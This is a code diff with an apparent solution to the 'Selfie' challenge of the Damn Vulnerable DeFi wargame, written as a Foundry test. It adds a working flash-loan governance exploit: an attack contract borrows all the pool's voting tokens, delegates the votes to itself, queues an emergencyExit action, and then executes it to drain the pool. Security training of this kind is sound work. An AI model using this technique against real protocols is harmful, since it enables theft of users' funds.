@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +64,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        AttackBorrower attackBorrower = new AttackBorrower(governance, recovery);
+        pool.flashLoan(attackBorrower, address(token), pool.maxFlashLoan(address(token)), "");
+        vm.warp(2 days + 1);
+        governance.executeAction(attackBorrower.getActionId());
     }
 
     /**
@@ -72,5 +77,34 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract AttackBorrower is IERC3156FlashBorrower {
+    SimpleGovernance governance;
+    address recovery;
+    uint256 actionId;
+
+    constructor(SimpleGovernance _governance, address _recovery) {
+        governance = _governance;
+        recovery = _recovery;
+    }
+
+    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata)
+        external
+        override
+        returns (bytes32)
+    {
+        DamnValuableVotes(token).delegate(address(this));
+
+        actionId = governance.queueAction(msg.sender, 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery)));
+
+        IERC20(token).approve(address(msg.sender), amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function getActionId() public view returns (uint256) {
+        return actionId;
     }
 }
